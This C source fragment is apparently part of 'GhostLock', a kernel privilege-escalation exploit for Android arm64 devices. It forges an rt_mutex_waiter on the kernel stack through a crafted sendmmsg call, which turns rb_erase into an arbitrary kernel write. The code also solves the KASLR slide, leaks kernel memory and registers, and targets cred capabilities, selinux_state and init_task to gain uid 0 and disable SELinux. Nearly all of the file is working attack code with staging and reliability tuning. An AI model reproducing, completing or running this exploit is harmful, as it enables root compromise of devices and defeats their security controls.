static int   g_spray_selftest;  /* --spray-selftest: host-side fill mapping  */
static const char *g_vr_exec_probe;  /* --vr-exec-probe PATH (post-exec child) */
static FILE *g_log;
static const char *g_logpath;
static const char *g_delta_path;   /* --delta, default /data/local/tmp/p (device) */
static const char *g_vr_target;    /* --vr-target, default /init (device)       */
static int   g_vr_override;        /* --vr-target given explicitly             */
static unsigned long D;         /* KASLR slide for this boot           */

static unsigned long A_text, A_init_cred, A_init_task, A_state;
static unsigned long A_pco, A_rq, A_tcp_ent, A_oops_cxt;
/* intent 662 */
static unsigned long A_ss, A_pm_node, A_pm_hi;
static int g_pmsg_start = -1;          /* ring start S of the pmsg data area  */
static int g_pmsg_start_certain;       /* 1 = recovered from the head copy    */
static unsigned long g_perm_node_addr; /* X: fake ebitmap_node (pmsg window)  */
static unsigned long g_perm_hi_value;  /* W: value written into .highbit      */
static unsigned long g_perm_img_idx;   /* image index of the node (debug)     */
static const char *g_stop_after;       /* --stop-after=permpre|permnode|...   */
static int g_perm_dwell_s;             /* --perm-dwell=SEC                    */
static int g_perm_stopped;             /* do_chain returned through a stage   */
static int g_perm_allow_ambiguous;     /* --perm-allow-ambiguous              */
static int g_perm_prearmed;            /* i706: map armed by perm_prearm()   */
static int g_perm_behavior_unproven;  /* i706: file oracle advisory only    */

static const char *g_perm_probe_path;  /* --perm-probe=PATH (D row)           */
/* glx_p11i (intent 744): stage 3 -- Shizuku.  Consumed only by the
 * shzlaunch/shzcheck stop stages; --shz-after-deliver defers the launch
 * until AFTER the delivery (Phase B) leg, so a single run walks
 * Phase A -> Phase B -> stage 3 without a second cold boot. */
static struct shz_opts g_shz = { .mode = SHZ_MODE_AUTO };
static int g_shz_after_deliver;      /* --shz-after-deliver                 */
static int stage3_shizuku(void);     /* defined before main()               */
#define PERM_STAGE(x) (g_stop_after && !strcmp(g_stop_after, (x)))
static unsigned long off_real = D_OFF_REAL, off_cred = D_OFF_CRED,
                     off_comm = D_OFF_COMM, off_ptracer = D_OFF_PTRACER,
                     rq_curr_off = D_RQ_CURR, cred_euid = D_CRED_EUID;

/* pivot (tcp_mem ctl_table) */
static struct {
    const char *path, *name;
    unsigned long ent, data_slot;
    unsigned long maxlen;
    unsigned int mode;
    int cls;
} P;
static char cbuf[262144];
static char dbuf[131072];

/* ------------------------------------------------------------------ logging */
static void L(const char *fmt, ...)
{
    char b[1024];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(b, sizeof(b), fmt, ap);
    va_end(ap);
    printf("GLX|%s\n", b);
    fflush(stdout);
    if (g_log) { fprintf(g_log, "GLX|%s\n", b); fflush(g_log); }
}

static void res(const char *name, int cond, const char *fmt, ...)
{
    char b[900];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(b, sizeof(b), fmt, ap);
    va_end(ap);
    if (!cond) g_fails++;
    printf("RES|%s|%s|%s\n", cond ? "PASS" : "FAIL", name, b);
    fflush(stdout);
    if (g_log) { fprintf(g_log, "RES|%s|%s|%s\n", cond ? "PASS" : "FAIL", name, b); fflush(g_log); }
}

/* ------------------------------------------------------------- shot ledger
 * Every GhostLock shot is tagged with its stage name and asserted against the
 * designed order (glx_p4: a runtime per-shot assertion, fact 575 item 4). */
static void shot_tag(const char *name)
{
    if (g_shotlog_n < SHOTLOG_MAX) g_shotlog[g_shotlog_n] = name;
    g_shotlog_n++;
}
static void shotlog_verify(const char *const *want, int n, const char *where)
{
    int i;
    for (i = 0; i < n; i++) {
        if (i >= g_shotlog_n || !g_shotlog[i] || strcmp(g_shotlog[i], want[i]) != 0) {
            L("SHOTLEDGER[%s] idx=%d want=%s got=%s", where, i, want[i],
              (i < g_shotlog_n && g_shotlog[i]) ? g_shotlog[i] : "(none)");
            g_shotlog_bad++;
        }
    }
    if (g_shotlog_n != n) {
        L("SHOTLEDGER[%s] count=%d want=%d", where, g_shotlog_n, n);
        g_shotlog_bad++;
    }
    L("SHOTLEDGER[%s] %s shots=%d want=%d bad=%d", where,
      g_shotlog_bad ? "MISMATCH" : "OK", g_shotlog_n, n, g_shotlog_bad);
    /* P2 (intent 598): this used to be a log line only -- a mis-ordered or
     * mis-counted ledger still ended in RESULT=PASS.  It is a GATE now: a
     * manufactured mismatch is a FAIL and the run cannot claim PASS. */
    {
        char nm[64];
        snprintf(nm, sizeof(nm), "SHOTLEDGER_%s", where);
        res(nm, g_shotlog_bad == 0,
            "where=%s shots=%d want=%d bad=%d (gate, P2)", where, g_shotlog_n,
            n, g_shotlog_bad);
    }
}

static int rd_file(const char *p, char *b, int n)
{
    int fd, r;
    if (n < 2) return -1;
    b[0] = 0;
    fd = open(p, O_RDONLY);
    if (fd < 0) return -errno;
    r = read(fd, b, n - 1);
    close(fd);
    if (r < 0) { b[0] = 0; return -errno; }
    b[r] = 0;
    while (r > 0 && (b[r-1] == '\n' || b[r-1] == '\r')) b[--r] = 0;
    return r;
}

static int wr_file(const char *p, const char *s)
{
    int fd, r;
    fd = open(p, O_WRONLY);
    if (fd < 0) return -errno;
    r = write(fd, s, strlen(s));
    close(fd);
    return r < 0 ? -errno : r;
}

static int wrblob(const char *p, const void *b, size_t len)
{
    int fd, r;
    fd = open(p, O_WRONLY);
    if (fd < 0) return -errno;
    r = write(fd, b, len);
    close(fd);
    return r < 0 ? -errno : (r == (int)len ? 0 : -EIO);
}

/* ------------------------------------------------------------- gl backend */
static int ctl_path(const char *path, const char *cmd, char *out, int cap)
{
    int fd, r;
    fd = open(path, O_RDWR);
    if (fd < 0) return -errno;
    r = write(fd, cmd, strlen(cmd));
    if (r < 0) { close(fd); return -errno; }
    if (out) {
        lseek(fd, 0, SEEK_SET);
        r = read(fd, out, cap - 1);
        if (r < 0) r = 0;
        out[r] = 0;
    }
    close(fd);
    return 0;
}

static int ctl(const char *cmd, char *out, int cap)
{
    return ctl_path(GLCTL, cmd, out, cap);
}

static unsigned long sym_get(const char *out, const char *name)
{
    const char *p = out;
    char a[64];
    unsigned long v;
    while ((p = strstr(p, "SYM "))) {
        if (sscanf(p, "SYM %63s %lx", a, &v) == 2 && !strcmp(a, name))
            return v;
        p += 4;
    }
    return 0;
}

static unsigned long off_get(const char *out, const char *key)
{
    const char *p = strstr(out, "OFF ");
    char pat[64], *q;
    if (!p) return 0;
    snprintf(pat, sizeof(pat), " %s=", key);
    q = strstr(p, pat);
    return q ? strtoul(q + strlen(pat), NULL, 10) : 0;
}

static int hex_get(const char *out, unsigned char *buf, int cap)
{
    const char *p = strstr(out, "HEX ");
    const char *h;
    int n = 0;
    if (!p) return -1;
    h = strchr(p + 4, ' ');
    if (!h) return -1;
    h++;
    while (*h == ' ') h++;
    while (h[0] && h[1] && n < cap) {
        char t[3] = { h[0], h[1], 0 };
        if (!isxdigit((unsigned char)h[0])) break;
        buf[n++] = (unsigned char)strtoul(t, NULL, 16);
        h += 2;
    }
    return n;
}

static int gl_hex(unsigned long a, unsigned char *buf, int len)
{
    char c[128];
    snprintf(c, sizeof(c), "hex %lx %d", a, len);
    if (ctl(c, cbuf, sizeof(cbuf)) < 0) return -1;
    return hex_get(cbuf, buf, len);
}

static unsigned long gl_u64(unsigned long a)
{
    unsigned char b[8];
    if (gl_hex(a, b, 8) != 8) return 0;
    { unsigned long v = 0; memcpy(&v, b, 8); return v; }
}

static unsigned long rd64u(const unsigned char *b, int off)
{
    unsigned long v = 0;
    memcpy(&v, b + off, 8);
    return v;
}

static int parse_nums(const char *txt, unsigned long long *out, int maxints)
{
    const char *p = txt;
    int n = 0;
    while (n < maxints) {
        char *e;
        unsigned long long v;
        while (*p == ' ' || *p == '\t' || *p == '\n') p++;
        if (!*p) break;
        v = strtoull(p, &e, 10);
        if (e == p) break;
        out[n++] = v;
        p = e;
    }
    return n;
}

/* ----------------------------------------------------- device perf sampler */
struct psample { uint64_t ip; uint64_t regs[PERF_NREGS]; };
#define MAXSAMPLES 8192
static struct psample g_samp[MAXSAMPLES];
static int g_nsamp;
static struct perf_event_mmap_page *g_meta;
static void *g_ring;
static int g_perffd = -1;

static int perf_start(int period, int ring_pages)
{
    struct perf_event_attr pe;
    size_t pg = 4096;
    memset(&pe, 0, sizeof(pe));
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_period = period;
    pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_REGS_INTR;
    pe.sample_regs_intr = (1ULL << PERF_NREGS) - 1;
    pe.disabled = 1;
    pe.exclude_kernel = 0;
    pe.exclude_user = 0;
    pe.exclude_hv = 1;
    pe.wakeup_events = 1;
    g_perffd = (int)syscall(SYS_perf_event_open, &pe, 0, -1, -1, 0);
    if (g_perffd < 0) return -errno;
    g_ring = mmap(NULL, pg * (ring_pages + 1), PROT_READ | PROT_WRITE,
                  MAP_SHARED, g_perffd, 0);
    if (g_ring == MAP_FAILED) { close(g_perffd); g_perffd = -1; return -ENOMEM; }
    g_meta = (struct perf_event_mmap_page *)g_ring;
    ioctl(g_perffd, PERF_EVENT_IOC_RESET, 0);
    ioctl(g_perffd, PERF_EVENT_IOC_ENABLE, 0);
    g_nsamp = 0;
    return 0;
}

static int perf_stop(int ring_pages)
{
    uint64_t head, pos;
    unsigned char *data = (unsigned char *)g_ring + 4096;
    size_t data_sz = (size_t)4096 * ring_pages;
    int total = 0;
    if (g_perffd < 0) return -1;
    ioctl(g_perffd, PERF_EVENT_IOC_DISABLE, 0);
    head = g_meta->data_head;
    __sync_synchronize();
    pos = g_meta->data_tail;
    while (pos + 8 <= head) {
        struct perf_event_header hdr;
        unsigned char tmp[512];
        size_t cp;
        memcpy(&hdr, data + (pos % data_sz), sizeof(hdr));
        if (hdr.size < 8 || pos + hdr.size > head) break;
        if (hdr.type == PERF_RECORD_SAMPLE) {
            unsigned char *q;
            int nreg;
            cp = hdr.size <= sizeof(tmp) ? hdr.size : sizeof(tmp);
            memcpy(tmp, data + (pos % data_sz), cp);
            q = tmp + sizeof(hdr);
            if (cp >= 32) {
                uint64_t ip; uint32_t pid, tid; uint64_t abi;
                memcpy(&ip, q, 8); q += 8;
                memcpy(&pid, q, 4); q += 4;
                memcpy(&tid, q, 4); q += 4;
                /* FIX (i492): PERF_SAMPLE_REGS_INTR emits a u64 abi word
                 * BEFORE regs[].  Without this skip regs[0] is the constant
                 * abi (2 = PERF_SAMPLE_REGS_ABI_64) and every x0 read is
                 * garbage -- device evidence in fact 492 / perftest2b. */
                memcpy(&abi, q, 8); q += 8;
                (void)pid; (void)tid; (void)abi;
                /* bytes consumed before regs[]: hdr(8)+ip(8)+pid/tid(8)+abi(8) */
                nreg = (int)((hdr.size - 32) / 8);
                if (nreg > PERF_NREGS) nreg = PERF_NREGS;
                if (nreg < 0) nreg = 0;
                if (g_nsamp < MAXSAMPLES) {
                    g_samp[g_nsamp].ip = ip;
                    memset(g_samp[g_nsamp].regs, 0, sizeof(g_samp[0].regs));
                    memcpy(g_samp[g_nsamp].regs, q, (size_t)nreg * 8);
                    g_nsamp++;
                }
                total++;
            }
        }
        pos += hdr.size;
    }
    g_meta->data_tail = head;
    close(g_perffd);
    g_perffd = -1;
    munmap(g_ring, (size_t)4096 * (ring_pages + 1));
    g_ring = NULL;
    return total;
}

static int is_kptr(unsigned long v)
{
    return v >= 0xffffff8000000000UL;
}

/* ------------------------------------------------- glx_p7 pure predicates
 * (intent 630 / fact 628)  Pure on purpose: unit_test.c includes this file and
 * exercises the production code verbatim.
 *   d_candidate_valid() : D-solve acceptance (2 MB aligned, inside the scan
 *                         window, D+LINK_{S,E}TEXT are canonical kernel VAs)
 *   n9v_state_ok()      : post-N9 selinux_state pattern (N9's secondary store
 *                         puts p0 at state[1..8] => 00 00 F1 ... )
 *   n10_state_ok()      : sel_read_enforce(state[1]) == 1 (fact 628 fix 3)   */
#define D_RETRY_MAX 5
static int d_candidate_valid(uint64_t d)
{
    uint64_t lo, hi;
    if ((d & 0x1fffffULL) != 0) return 0;                    /* 2 MB aligned */
    if (d < 0x1000000000ULL || d >= 0x3000000000ULL) return 0; /* scan range */
    lo = d + (uint64_t)LINK_STEXT;
    hi = d + (uint64_t)LINK_ETEXT;
    if (hi <= lo) return 0;                                  /* empty/wrap   */
    if (!is_kptr((unsigned long)lo) || !is_kptr((unsigned long)(hi - 1)))
        return 0;                                            /* not kernel VA*/
    return 1;
}
static int n9v_state_ok(const unsigned char *b, unsigned long p0)
{
    int ok, j;
    if (!b) return 0;
    ok = b[0] == 0 && b[1] == 0 && b[2] == 0 && (b[3] & 1);
    for (j = 0; j < 5 && ok; j++)
        if (b[4 + j] != (unsigned char)(p0 >> (24 + 8 * j))) ok = 0;
    return ok;
}
static int n10_state_ok(const unsigned char *b)
{
    return (b && b[1] == 1 && b[2] == 0 && (b[3] & 1)) ? 1 : 0;
}
/* glx_p7 fix 2: the R1 acceptance predicate.  A correct D makes
 * __per_cpu_offset[] a pair of page-aligned pointers with a 4 KiB stride; the
 * device's pseudo-pco values (0x2c257 / 0x4237e) fail both halves. */
static int pco_pair_ok(unsigned long long p0, unsigned long long p1)
{
    return (p0 && (p0 & 0xfff) == 0 && (p1 & 0xfff) == 0 &&
            ((p1 - p0) % 0x1000) == 0) ? 1 : 0;
}

/* --------------------------------------------------- P1 identity / P6 align
 * All four helpers are pure and are exercised by the host unit test. */
/* glx_p6 item ⑤ (P5_TO_P6_TODO §B4): bounded retry for the fail-closed P1
 * gates.  T busy-waits inside dev_fill_waiter_once() and is pinned to CPU1, so
 * a miss is a scheduling wobble, not a defect; aborting on the first miss
 * burns a whole device run.  5 tries x 1 ms stays far below the noise floor of
 * the pre-shot stages and cannot mask a genuinely foreign task: the retries
 * are re-reads of the SAME address with the SAME identity predicate. */
#define P1_RETRY_MAX     5
#define P1_RETRY_GAP_US  1000
/* Generate the nonce T publishes with prctl(PR_SET_NAME).  12 hex chars: it has
 * to fit TASK_COMM_LEN-1 = 15 and it must be unique for this boot/process, so
 * that a stale or foreign task can never accidentally match. */
static void nonce_init(void)
{
    unsigned char r[8];
    int fd, i;
    memset(r, 0, sizeof(r));
    fd = open("/dev/urandom", O_RDONLY);
    if (fd >= 0) {
        if (read(fd, r, sizeof(r)) != (ssize_t)sizeof(r)) memset(r, 0, sizeof(r));
        close(fd);
    }
    if (!r[0] && !r[1] && !r[2] && !r[3]) {
        unsigned long x = ((unsigned long)getpid() * 2654435761UL) ^
                          (unsigned long)time(NULL);
        memcpy(r, &x, sizeof(x) < sizeof(r) ? sizeof(x) : sizeof(r));
    }
    g_t_nonce[0] = 'g';
    g_t_nonce[1] = 'x';
    for (i = 0; i < 10; i++)
        g_t_nonce[2 + i] = "0123456789abcdef"[(r[i / 2] >> (4 * (i & 1))) & 0xf];
    g_t_nonce[12] = 0;
    L("P1 identity nonce='%s' (len=%d) published by T via PR_SET_NAME",
      g_t_nonce, (int)strlen(g_t_nonce));
}

/* 16-byte task->comm (read via R3C) must be exactly our nonce. */
static int comm_is_t_nonce(const char *n16)
{
    size_t L = strlen(g_t_nonce);
    if (!L || L > 15) return 0;
    return memcmp(n16, g_t_nonce, L) == 0 && n16[L] == 0;
}

/* R3C: the ONLY identity proof between the task_struct read from rq->curr and
 * T.  Mismatch => res FAIL => do_chain aborts before W1..W6, so we can never
 * hand uid0 + DAC caps to an unrelated uid-2000 process. */
static int r3c_check(const char *n16)
{
    int ok = comm_is_t_nonce(n16);
    L("R3c comm[0..15]='%.16s' want T nonce '%s' -> %s", n16, g_t_nonce,
      ok ? "MATCH" : "MISMATCH");
    res("R3C_COMM", ok, "comm=%.16s want=%.12s (P1 identity gate)", n16, g_t_nonce);
    return ok;
}

/* P6 + glx_p6 item ⑥ (fact 607①, corrects 591/P5_PATCHLIST).
 *
 * The real rb_erase case-1 shape in the C.53 binary (i552g/dis_rb_erase.txt,
 * rb_erase+0x54) is:
 *     ldr  x10,[x0]              ; rb_parent_color of node
 *     ands x8,x10,#~3            ; parent = pc & ~3
 *     ldr  x11,[x8,#16]          ; parent->rb_left
 *     cmp  x11,x0
 *     str  x9,[x8,#8]            ; parent->rb_right = child
 *     str  x10,[x9]              ; child->__rb_parent_color = pc
 * with x0 = node (our write address derived from the waiter) and the primary
 * 8-byte store landing on `target` via the parent/child pair.
 *
 * 591 claimed that a 4-mod-8 target yields parent = target-12 and therefore a
 * shifted store; that is WRONG.  For target == 4 (mod 8), target-8 == 4 (mod 8)
 * has its low two bits zero, so (target-8) & ~3 == target-8: parent is still
 * target-8 and the primary store still lands on `target` (an unaligned 8-byte
 * store is legal on arm64).  So:
 *   - this alignment guard is a ZERO-COST belt-and-braces check; cred_jar is
 *     always 8-byte aligned, so it never changes a reachable path;
 *   - the only branch that can move the primary store to target-8 is
 *     __rb_change_child()'s `parent->rb_left == node` comparison.  P4 anchors
 *     P0 inside our own pmsg page and pmsg_write_img() zeroes that page before
 *     every write shot, so parent->rb_left (0) can never equal node (p0 or
 *     p0+1): that branch is deterministically excluded;
 *   - the actual residual risk is therefore not a shifted store but the fact
 *     that our P0 page shares memory with the kernel console pmsg ring
 *     (P5_TO_P6_TODO §B3): a kernel log line written between the refill and the
 *     shot could perturb *(p0).
 */
static int rb_parent_ok(unsigned long target)
{
    return ((target - 8) & ~3UL) == (target - 8);
}
static int cred_align_ok(unsigned long cred)
{
    if ((cred & 7) != 0) return 0;
    if (!rb_parent_ok(cred + CRED_OFF_CAP_INH)) return 0;
    if (!rb_parent_ok(cred + CRED_OFF_CAP_EFF)) return 0;
    if (!rb_parent_ok(cred + CRED_OFF_CAP_BSET)) return 0;
    if (!rb_parent_ok(cred + CRED_OFF_CAP_AMB)) return 0;
    return 1;
}

/* ------------------------------------------------------- device futex ring */
static int *fA, *fB, *fC, *fD;
static volatile int t_ready, t_go, t_done, o_ready, o_go, h_ready;
static volatile pid_t t_tid, o_tid, h_tid;
static volatile int spray_gen, spray_done_gen;
/* fact 569 fill state: T itself builds and issues the two-message sendmmsg;
 * main only publishes target/value and waits for spray_done_gen. */
static volatile int spray_res, spray_errno;      /* 0 = fill ok, -1 = failed  */
static volatile unsigned long g_spray_target, g_spray_value;
static int g_fill_fd = -1;          /* AF_INET/SOCK_DGRAM, created by T        */
static int spray_off = 0;           /* CLI compat only: geometry is now fixed  */
/* ---- i731 (intent 738) hardening: seal the primitive before SETIDS ------ */
static int g_shots_sealed;              /* 1 => dev_write8() refuses to shoot  */
static int g_no_purge;                  /* --no-purge   (A/B switch)           */
static int g_no_quiesce;                /* --no-quiesce (A/B switch)           */
static int g_quiesce_tasks = -1;        /* thread count after quiesce          */
/* ---- i739 (intent 754): minimal-risk SETIDS ----------------------------- */
static int g_setids_glibc;              /* --setids-glibc: A/B, old wrappers   */
static int g_allow_mt_setids;           /* --allow-mt-setids: skip thread gate */
static volatile int g_t_quit, g_o_quit, g_h_quit, g_t_unlocked;
static pthread_t g_thr_t, g_thr_o, g_thr_h;   /* i731: joinable handles */
static int task_count_self(void);
static int ring_quiesce(void);
static int pmsg_purge_fake_lock(void);
static int shot_guard(void) { return g_shots_sealed ? -7 : 0; }
static volatile int g_t_policy = 0;
static unsigned long g_victim_task;   /* T's task_struct (from R2 on CPU1) */
static unsigned long g_fake_lock;     /* pmsg vmap page object address    */
static int g_t_cpu = 1, g_main_cpu = 0;
static void dev_write8_prepare(void);
/* i510 forward decls (definitions live in the pmsg section below) */
static int pmsg_write_img(void);
static int g_pmsg_ready;
static int g_pmsg_refill;
static int g_pmsg_refills;
static unsigned long g_pmsg_cursor;

/* ---------------------------------------------- fact-569 fake-waiter fill */
/* Geometry (C.53 instruction-level, fact 569):
 *
 *   __sys_sendmmsg frame (vlen>=2, per-iteration memset of address[] and
 *   iovstack[]; used_address memset only once at entry):
 *     used_address->name  = stack_base+0x3C18 .. +0x3C98 (0x80B sockaddr)
 *     used_address->name_len = stack_base+0x3C98
 *     iovstack            = stack_base+0x3CA0 .. +0x3D20
 *     address             = stack_base+0x3D20 .. +0x3DA0
 *   Dangling waiter slot  = stack_base+0x3C80 .. +0x3CD0 (fact 505/527)
 *
 *   msg0 (name=sa, namelen=0x80, iov=v0[1]) MUST BE SENT (rc==1):
 *       move_addr_to_kernel(user sa -> address@0x3D20, 0x80)
 *       sock_sendmsg() returns 1  =>  memcpy(used_address@0x3C18,
 *                                            address@0x3D20, 0x80)
 *       i.e. the head of the waiter (0x3C80..0x3C98) becomes sa[0x68..0x80].
 *   msg1 (name=NULL, namelen=0, iov=v1[3]) MUST FAIL in import_iovec:
 *       copy_from_user(iovstack@0x3CA0, v1, 0x30) happens BEFORE the
 *       iov_len sign check, and v1[1].iov_len = fake_lock has bit63 set, so
 *       rw_copy_check_uvector returns -EINVAL after the bytes landed;
 *       __sys_sendmmsg breaks out and returns datagrams==1.
 *       => the tail (0x3CA0..0x3CD0) becomes v1.
 *
 * Resulting waiter image relative to stack_base+0x3C80:
 *   +0x00 __rb_parent_color = target-8      (sa[0x68])
 *   +0x08 rb_right          = value         (sa[0x70])
 *   +0x10 rb_left           = 0             (sa[0x78])
 *   +0x18 pi_tree.__rb_parent_color = 0x80  ** the only 8 uncontrolled B **
 *   +0x20 pi_tree.rb_right  = v1[0].base    (not consumed, owner==0)
 *   +0x28 pi_tree.rb_left   = v1[0].len
 *   +0x30 task              = A_init_task   (fact 562: safe wake target)
 *   +0x38 lock              = g_fake_lock   (fact 531: the one 8B tail)
 *   +0x40 prio              = 0             (== 0 != task->prio 120)
 *   +0x48 deadline          = 0             (dl_prio(0)==false: not read)
 */
#define WSLOT_STACK_OFF   0x3C80UL
#define WUSEDADDR_OFF     0x3C18UL
#define WFILL_SA_OFF      (WSLOT_STACK_OFF - WUSEDADDR_OFF)   /* 0x68 */
#define WFILL_NAME_LEN    0x80UL
#define WUNCTRL_OFF       0x18UL      /* 0x3C98..0x3CA0 */
#define WUNCTRL_LEN       8UL
#define WFIELD_HEAD       0x00UL      /* tree_entry: parent_color/right/left */
#define WFIELD_HEAD_LEN   0x18UL
#define WFIELD_PI         0x18UL      /* pi_tree_entry (not consumed)        */
#define WFIELD_PI_LEN     0x18UL
#define WFIELD_TASK       0x30UL
#define WFIELD_LOCK       0x38UL
#define WFIELD_PRIO       0x40UL
#define WFIELD_DEADLINE   0x48UL
#define WSLOT_LEN         0x50UL

#define W_NO_OVERLAP(a, al, b, bl) (((a) + (al) <= (b)) || ((b) + (bl) <= (a)))
_Static_assert(WUSEDADDR_OFF + WFILL_NAME_LEN == WSLOT_STACK_OFF + WUNCTRL_OFF,
               "namelen 0x80 must reach exactly 0x3C98");
_Static_assert(W_NO_OVERLAP(WUNCTRL_OFF, WUNCTRL_LEN, WFIELD_HEAD, WFIELD_HEAD_LEN),
               "uncontrolled 8B must not hit tree_entry head");
_Static_assert(W_NO_OVERLAP(WUNCTRL_OFF, WUNCTRL_LEN, WFIELD_TASK, 8),
               "uncontrolled 8B must not hit waiter->task");
_Static_assert(W_NO_OVERLAP(WUNCTRL_OFF, WUNCTRL_LEN, WFIELD_LOCK, 8),
               "uncontrolled 8B must not hit waiter->lock");
_Static_assert(W_NO_OVERLAP(WUNCTRL_OFF, WUNCTRL_LEN, WFIELD_PRIO, 8),
               "uncontrolled 8B must not hit waiter->prio");
_Static_assert(W_NO_OVERLAP(WUNCTRL_OFF, WUNCTRL_LEN, WFIELD_DEADLINE, 8),
               "uncontrolled 8B must not hit waiter->deadline");
_Static_assert(WUNCTRL_OFF >= WFIELD_PI &&
               WUNCTRL_OFF + WUNCTRL_LEN <= WFIELD_PI + WFIELD_PI_LEN,
               "the uncontrolled 8B is pi_tree.__rb_parent_color only");
_Static_assert(WFIELD_TASK == 0x30 && WFIELD_LOCK == 0x38,
               "struct rt_mutex_waiter field offsets drifted");

/* Runs on T (the victim thread) -- MUST be the last kernel entry on T's stack
 * before the sched_setattr trigger.  Returns 0 iff sendmmsg returned 1, which
 * is exactly "msg0 was sent (used_address written) and msg1 reached
 * import_iovec (iovstack written)". */
static int dev_fill_waiter_once(void)
{
    static unsigned char sa[0x80];
    static struct iovec v0[1], v1[3];
    static struct mmsghdr mm[2];
    static unsigned char one_byte;
    unsigned long tgt = g_spray_target, val = g_spray_value;
    long r;

    if (g_fill_fd < 0) { spray_errno = EBADF; return -1; }
    if (!is_kptr(A_init_task) || !is_kptr(g_fake_lock) || (g_fake_lock & 7) ||
        !is_kptr(tgt)) {
        spray_errno = EINVAL;
        return -1;
    }

    memset(sa, 0, sizeof(sa));
    sa[0] = 2;                        /* AF_INET (u16 LE)                  */
    sa[1] = 0;
    sa[2] = 0; sa[3] = 9;             /* sin_port = htons(9), non-zero     */
    sa[4] = 127; sa[5] = 0; sa[6] = 0; sa[7] = 1;   /* 127.0.0.1          */
    {
        unsigned long pc = tgt - 8, rb = val, rl = 0;
        memcpy(sa + WFILL_SA_OFF + 0x00, &pc, 8);   /* __rb_parent_color  */
        memcpy(sa + WFILL_SA_OFF + 0x08, &rb, 8);   /* rb_right = value   */
        memcpy(sa + WFILL_SA_OFF + 0x10, &rl, 8);   /* rb_left  = 0       */
    }

    /* msg0: valid 1-byte send; must succeed so used_address is written.   */
    v0[0].iov_base = &one_byte;
    v0[0].iov_len = 1;

    /* msg1: 3 iovecs copied verbatim into iovstack, then rejected because
     * v1[1].iov_len (= fake lock, a kernel pointer) is negative as ssize_t. */
    v1[0].iov_base = (void *)0;                       /* pi rb_right      */
    v1[0].iov_len = 0;                                /* pi rb_left       */
    v1[1].iov_base = (void *)A_init_task;             /* waiter->task     */
    v1[1].iov_len = (size_t)g_fake_lock;              /* waiter->lock     */
    v1[2].iov_base = (void *)0;                       /* prio = 0         */
    v1[2].iov_len = 0;                                /* deadline = 0     */

    memset(mm, 0, sizeof(mm));
    mm[0].msg_hdr.msg_name = sa;
    mm[0].msg_hdr.msg_namelen = (socklen_t)WFILL_NAME_LEN;
    mm[0].msg_hdr.msg_iov = v0;
    mm[0].msg_hdr.msg_iovlen = 1;
    mm[1].msg_hdr.msg_name = NULL;
    mm[1].msg_hdr.msg_namelen = 0;
    mm[1].msg_hdr.msg_iov = v1;
    mm[1].msg_hdr.msg_iovlen = 3;

    errno = 0;
    r = syscall(SYS_sendmmsg, g_fill_fd, mm, 2, 0);
    if (r != 1) {
        spray_errno = errno ? errno : EIO;
        return -1;
    }
    return 0;
}

/* Host-side model of the same mapping (exercised by --spray-selftest and by
 * the standalone host unit test, which compare it byte-for-byte with the
 * target 0x50B waiter image). */
static void fill_template(unsigned long *w, unsigned long target, unsigned long value,
                          unsigned long task, unsigned long lock)
{
    memset(w, 0, WSLOT_LEN);
    w[WFIELD_HEAD / 8] = target - 8;
    w[(WFIELD_HEAD + 8) / 8] = value;
    w[(WFIELD_HEAD + 0x10) / 8] = 0;
    w[WUNCTRL_OFF / 8] = WFILL_NAME_LEN;          /* 0x80, not controllable */
    w[WFIELD_TASK / 8] = task;
    w[WFIELD_LOCK / 8] = lock;
    w[WFIELD_PRIO / 8] = 0;
    w[WFIELD_DEADLINE / 8] = 0;
}

static int spray_selftest(void)
{
    unsigned long w[WSLOT_LEN / 8];
    unsigned long tgt = 0xffffffc012c71708UL, val = 0xffffffc012c71800UL;
    unsigned long task = 0xffffffc012c71700UL, lock = 0xffffffc010f02010UL;
    fill_template(w, tgt, val, task, lock);
    if (w[WFIELD_HEAD / 8] != tgt - 8) return -1;
    if (w[WFIELD_HEAD / 8 + 1] != val) return -2;
    if (w[WFIELD_HEAD / 8 + 2] != 0) return -3;
    if (w[WUNCTRL_OFF / 8] != WFILL_NAME_LEN) return -4;
    if (w[WFIELD_TASK / 8] != task || w[WFIELD_LOCK / 8] != lock) return -5;
    if (w[WFIELD_PRIO / 8] != 0 || w[WFIELD_DEADLINE / 8] != 0) return -6;
    /* the four fields that must be controllable are outside the 8B hole */
    if (W_NO_OVERLAP(WUNCTRL_OFF, WUNCTRL_LEN, WFIELD_HEAD, WFIELD_HEAD_LEN) == 0)
        return -7;
    if (W_NO_OVERLAP(WUNCTRL_OFF, WUNCTRL_LEN, WFIELD_TASK, 8) == 0)
        return -8;
    if (W_NO_OVERLAP(WUNCTRL_OFF, WUNCTRL_LEN, WFIELD_LOCK, 8) == 0)
        return -9;
    return 0;
}

static int gl_sched_setscheduler(pid_t tid, int policy)
{
    struct {
        unsigned int size, sched_policy;
        unsigned long long sched_flags;
        int sched_nice;
        unsigned int sched_priority;
        unsigned long long sched_runtime, sched_deadline, sched_period;
    } a;
    memset(&a, 0, sizeof(a));
    a.size = 48;
    a.sched_policy = (unsigned int)policy;
    return (int)syscall(SYS_sched_setattr, tid, &a, 0);
}

static int futex6(int *uaddr, int op, int val, void *utime, int *uaddr2, int val3)
{
    return (int)syscall(SYS_futex, uaddr, op, val, utime, uaddr2, val3);
}

static void msleep(long ms)
{
    struct timespec ts = { ms / 1000, (ms % 1000) * 1000000L };
    nanosleep(&ts, NULL);
}

static void pin_cpu(int cpu)
{
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(cpu, &s);
    sched_setaffinity(0, sizeof(s), &s);
}

/* T: victim thread.  Holds C, waits on A(->B) with timeout, then stays in
 * userspace.  It only re-enters the kernel when asked to emit the fake-waiter
 * fill: ONE sendmmsg(fd, mm, 2, 0) issued by T itself (fact 569 geometry --
 * see dev_fill_waiter_once).  The old pselect6(320,...) spray was structurally
 * broken: core_sys_select copies at most FDS_BYTES(320)=40B per fd_set and
 * scatters one 0x50B template over three displaced segments. */
static void *thr_t(void *arg)
{
    int r;
    (void)arg;
    pin_cpu(g_t_cpu);
    t_tid = (pid_t)syscall(SYS_gettid);
    /* P1: T publishes the nonce into its own task->comm.  R3C reads
     * rq->curr->comm and compares -- this is the only link between the
     * task_struct our write target came from and this very thread. */
